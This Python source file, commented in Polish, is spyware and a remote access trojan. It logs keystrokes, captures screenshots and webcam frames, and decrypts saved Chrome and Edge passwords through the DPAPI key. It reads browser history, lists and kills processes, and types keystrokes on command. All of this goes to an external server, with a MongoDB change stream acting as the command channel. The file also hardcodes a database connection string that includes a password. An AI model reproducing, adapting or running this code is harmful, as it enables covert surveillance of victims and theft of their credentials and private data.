import requests
import urllib.request
import socket
from pynput import keyboard
import pyautogui
import asyncio
import os
from datetime import datetime
import atexit
from pymongo import MongoClient
import threading
import subprocess
import psutil
import signal
import platform
import pygetwindow as gw
import cv2
import sqlite3
import shutil
import json
import win32crypt
from Cryptodome.Cipher import AES
import base64
from pynput.keyboard import Controller

# 🎯 KONFIGURACJA
API_URL = "https://money-cat-bot.onrender.com"  # Zmienna do wskazania lokalizacji serwera Express
COMPUTER_NAME = socket.gethostname()

CAMERA_INDEX = 0  # Jeśli masz kilka kamerek, możesz zmienić
DELAY = 60  # Czas między wysyłaniem

ACTIVITY_ROLE_ID=1345172216731664424

keys_pressed = []
lock = asyncio.Lock()

pyautogui.FAILSAFE = False

cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)

client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
db = client['test']  # Zamień na nazwę swojej bazy danych
collection = db['requests']  # Zamień na nazwę swojej kolekcji

def watch_changes():
    change_stream = collection.watch()  # Otwiera strumień zmian
    print("😎 Started watching for changes!")
    for change in change_stream:
        data = change.get("fullDocument", {})
        name = data.get("COMPUTER_NAME")
        type = data.get("type")

        if name == COMPUTER_NAME.upper():
            print("Received request type:", type)
            match type and type.strip().lower():
                case "ss":
                    send_to_express("`✅` Successfully received `ss` request!", COMPUTER_NAME)
                    send_screenshot_now()
                
                case "camera":
                    send_to_express("`✅` Successfully received `camera` request!", COMPUTER_NAME)
                    send_camera_frame_now()

                case "info":
                    send_to_express("`✅` Successfully received `info` request!", COMPUTER_NAME)
                    send_info_now()

                case "utils":
                    send_to_express("`✅` Successfully received `utils` request!", COMPUTER_NAME)
                    send_utils_now()

                case "network_info":
                    send_to_express("`✅` Successfully received `network_info` request!", COMPUTER_NAME)
                    send_network_info_now()

                case "processes":
                    send_to_express("`✅` Successfully received `processes` request!", COMPUTER_NAME)
                    send_processes_now()
            
                case "process":
                    send_to_express("`✅` Successfully received `process` request!", COMPUTER_NAME)
                    args = data.get("args", {})
                    pid = args.get("id")
                    activity = args.get("activity")
                    if pid is None:
                        send_to_express("`⚠️` No PID provided!", COMPUTER_NAME)
                    if isinstance(pid, str) and pid.isdigit():
                        pid = int(pid)
                    if activity == "kill":
                        try:
                            if psutil.pid_exists(pid):
                                if platform.system() == "Windows":
                                    os.system(f"taskkill /PID {pid} /F")
                                else:
                                    os.kill(pid, signal.SIGTERM)
                                send_to_express(f"`💀` Successfully killed process `{pid}`!", COMPUTER_NAME)
                            else:
                                send_to_express(f"`❌` Process `{pid}` not found!", COMPUTER_NAME)
                        except ValueError:
                            send_to_express(f"`⚠️` Invalid PID `{pid}`!", COMPUTER_NAME)
                        except PermissionError:
                            send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_NAME)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_NAME)
                            print(e)

                case "applications":
                    send_to_express("`✅` Successfully received `applications` request!", COMPUTER_NAME)
                    send_to_express(list_open_apps(), COMPUTER_NAME, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)

                case "app":
                    send_to_express("`✅` Successfully received `app` request!", COMPUTER_NAME)
                    args = data.get("args", {})
                    activity = args.get("activity")
                    name = args.get("name")
                    if activity == "close":
                        close_app_by_name(name)
                        send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_NAME)
                
                case "history":
                    send_to_express("`✅` Successfully received `history` request!", COMPUTER_NAME)
                    args = data.get("args", {})
                    name = args.get("name")
                    id = args.get("id")
                    history_array = get_browser_history(browser=name, limit=id)
                    try:
                        requests.post(f"{API_URL}/history", json={"COMPUTER_NAME": COMPUTER_NAME, "history": history_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "passwords":
                    send_to_express("`✅` Successfully received `passwords` request!", COMPUTER_NAME)
                    args = data.get("args", {})
                    name = args.get("name")
                    passwords_array = get_browser_passwords(browser=name)
                    try:
                        requests.post(f"{API_URL}/passwords", json={"COMPUTER_NAME": COMPUTER_NAME, "passwords": passwords_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "keyboard":
                    send_to_express("`✅` Successfully received `keyboard` request!", COMPUTER_NAME)
                    keyboard = Controller()
                    args = data.get("args", {})
                    activity = args.get("activity")
                    content = args.get("content")
                    if activity == "write":
                        try:
                            keyboard.type(content)
                            send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_NAME)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_NAME)
                            print(e)
                    elif activity == "key":
                        try:
                            if content in pyautogui.KEYBOARD_KEYS:
                                pyautogui.press(content)
                                send_to_express(f"`💻` Successfully sent `[{content.upper()}]` to keyboard!", COMPUTER_NAME)
                            else:
                                send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_NAME)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_NAME)
                            print(e)
                    elif activity == "list":
                        try:
                            excluded_keys = set("!\"#$%&'()*+,-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
                            filtered_keys = [key.strip() for key in pyautogui.KEYBOARD_KEYS if key.strip() and key not in excluded_keys]
                            keys_list = "\n".join(filtered_keys)
                            send_to_express(keys_list, computer_name=COMPUTER_NAME, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_NAME)
                            print(e)

            document_id = data.get("_id")
            if document_id:
                collection.delete_one({"_id": document_id})
                print(f"Document with ID {document_id} has been removed!")

def run_watch():
    thread = threading.Thread(target=watch_changes)
    thread.daemon = True
    thread.start()

def open_app():
    try:
        subprocess.Popen([r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"])  # Używamy Popen, aby nie blokować głównego wątku
        print("✅ Browser started!")
    except Exception as e:
        print(e)

def send_to_express(message, computer_name=None, code_block=False, isEmbed=False, Title=None, Color=False):
    payload = {
        "message": message,
        "COMPUTER_NAME": computer_name,
        "isEmbed": isEmbed,
        "Title": Title,
        "Color": Color,
    }

    if (code_block):
        payload["message"] = f"```{message}```"

    try:
        requests.post(f"{API_URL}/send", json=payload)
    except requests.exceptions.RequestException as e:
        print(e)

def on_press(key):
    try:
        keys_pressed.append(key.char)
    except AttributeError:
        keys_pressed.append(f"[{key.name.upper()}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()

async def send_screenshot():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    while True:
        await asyncio.sleep(DELAY)

        screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        pyautogui.screenshot().save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            files = {'screenshot': f}
            requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
        
        os.remove(screenshot_path)

def send_screenshot_now():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
    pyautogui.screenshot().save(screenshot_path)

    with open(screenshot_path, 'rb') as f:
        files = {'screenshot': f}
        data = {
            "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
            "COMPUTER_NAME": COMPUTER_NAME
        }
        requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
    os.remove(screenshot_path)

def send_info_now():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())
    user_info = os.getlogin() # Użytkownik systemu
    home_dir = os.path.expanduser("~") # Ścieżka do katalogu domowego
    cwd = os.getcwd() # Ścieżka do katalogu roboczego

    data = {
        "COMPUTER_NAME": COMPUTER_NAME,
        "external_ip": external_ip,
        "private_ip": private_ip,
        "user_info": user_info,
        "home_dir": home_dir,
        "cwd": cwd,
    }

    try:
        requests.post(f"{API_URL}/info", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_utils_now():
    cpu_percent = psutil.cpu_percent(interval=1)  # Użycie CPU
    memory = psutil.virtual_memory()  # Informacje o pamięci RAM
    disk_usage = psutil.disk_usage('/')  # Informacje o dyskach
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    memory_dict = {
        "total": memory.total,
        "used": memory.used,
        "free": memory.free,
        "percent": memory.percent,
    }

    disk_usage_dict = {
        "total": disk_usage.total,
        "used": disk_usage.used,
        "free": disk_usage.free,
        "percent": disk_usage.percent,
    }

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    data = {
        "COMPUTER_NAME": COMPUTER_NAME,
        "cpu_percent": f"{cpu_percent}%",
        "memory": memory_dict,
        "disk_usage": disk_usage_dict,
        "net_if_addrs": net_if_addrs_dict,
    }

    try:
        requests.post(f"{API_URL}/utils", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_network_info_now():
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    try:
        requests.post(f"{API_URL}/network_info", json={ "COMPUTER_NAME": COMPUTER_NAME, "net_if_addrs": net_if_addrs_dict })
    except requests.exceptions.RequestException as e:
        print(e)

def send_processes_now():
    processes = psutil.process_iter()

    processes_list = []
    for process in processes:
        try:
            processes_list.append({
                "pid": process.pid,
                "name": process.name(),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    try:
        requests.post(f"{API_URL}/processes", json={ "COMPUTER_NAME": COMPUTER_NAME, "processes": processes_list })
    except requests.exceptions.RequestException as e:
        print(e)

async def send_keys():
    while True:
        await asyncio.sleep(DELAY)

        async with lock:
            if keys_pressed:
                send_to_express(''.join(keys_pressed), COMPUTER_NAME, code_block=True, isEmbed=True, Title="Key Logger")
                keys_pressed.clear()

def start_bot(external_ip, private_ip):
    try:
        requests.post(f"{API_URL}/start", json={"COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip})
    except requests.exceptions.RequestException as e:
        print(e)
        
async def send_camera_frame():
    if not cap.isOpened():
        print("❌ Can not get image from camera!")
        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
        return
    
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    while True:
        await asyncio.sleep(DELAY)

        ret, frame = cap.read()
        if not ret:
            print("❌ Error connecting to camera frame!")
            send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
            break

        frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę

        with open(frame_path, 'rb') as f:
            files = {'frame': f}
            try:
                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
                if response.status_code == 200:
                    print(f"✔️ Frame uploaded successfully: {frame_path}")
                else:
                    print(f"❌ Failed to upload frame: {response.status_code}")
            except Exception as e:
                print(f"❌ Error while sending frame: {e}")
        
        os.remove(frame_path)  # Usuwamy plik po wysłaniu
    cap.release()

def send_camera_frame_now():

    if not cap.isOpened():
        print("❌ Can not get image from camera!")
        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
        return
    
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
    
    ret, frame = cap.read()
    if not ret:
        print("❌ Error connecting to camera frame!")
        send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
        return

    frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
    cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę

    with open(frame_path, 'rb') as f:
        files = {'frame': f}
        try:
            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
            if response.status_code == 200:
                print(f"✔️ Frame uploaded successfully: {frame_path}")
            else:
                print(f"❌ Failed to upload frame: {response.status_code}")
        except Exception as e:
            print(f"❌ Error while sending frame: {e}")
    os.remove(frame_path)  # Usuwamy plik po wysłaniu
    cap.release()

async def start():
    print("Starting the application...")

    open_app()
    run_watch()

    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())

    start_bot(external_ip, private_ip)
    print('✅ Application started!')

    await asyncio.gather(
        send_screenshot(),
        send_camera_frame(),
        send_keys(),
    )

def list_open_apps():
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    result = ""  # Zmienna do przechowywania nazw aplikacji
    for window in windows:
        if window.strip():  # Sprawdzamy, czy tytuł nie jest pusty
            result += window + "\n"  # Dodajemy tytuł do wyniku, oddzielony przecinkiem
    return result.strip("\n")  # Usuwamy ostatni przecinek i zwracamy wynik

def close_app_by_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    for window in windows:
        if app_name_part.lower() in window.lower():
            app = gw.getWindowsWithTitle(window)[0]
            app.close()

def get_full_app_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    full_app_names = []  # Lista na pełne nazwy aplikacji, które pasują do fragmentu
    for window in windows:
        if app_name_part.lower() in window.lower():  # Sprawdzamy, czy fragment nazwy pasuje
            full_app_names.append(window)  # Dodajemy pełną nazwę aplikacji do listy
    return full_app_names

# Funkcja do pobierania historii przeglądarek (Edge/Chrome)
def get_browser_history(browser="chrome", limit=10):
    if browser == "edge":
        history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
    else:  # Domyślnie Chrome
        history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
        
    history_copy = history_db + "_copy"
    shutil.copy2(history_db, history_copy)
    conn = sqlite3.connect(history_copy)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
    raw_history = cursor.fetchall()
    conn.close()
    os.remove(history_copy)
    
    history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
    return history_list

# Funkcja do pobierania klucza szyfrującego dla przeglądarki (Edge/Chrome)
def get_encryption_key(browser="chrome"):
    if browser == "edge":
        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
    else:  # Domyślnie Chrome
        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Funkcja do odszyfrowania hasła
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        return ""

# Funkcja do pobierania zapisanych haseł (Edge/Chrome)
def get_browser_passwords(browser="chrome"):
    if browser == "edge":
        db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
    else:  # Domyślnie Chrome
        db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
    
    temp_db = "LoginData.db"
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_encryption_key(browser)
    passwords = [{
        "url": url,
        "username": username,
        "password": decrypt_password(password, key)
    } for url, username, password in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return passwords

if __name__ == "__main__":
    asyncio.run(start())

cap.release()
cv2.destroyAllWindows()

def on_exit():
    print("❌ Program closing!")

atexit.register(on_exit)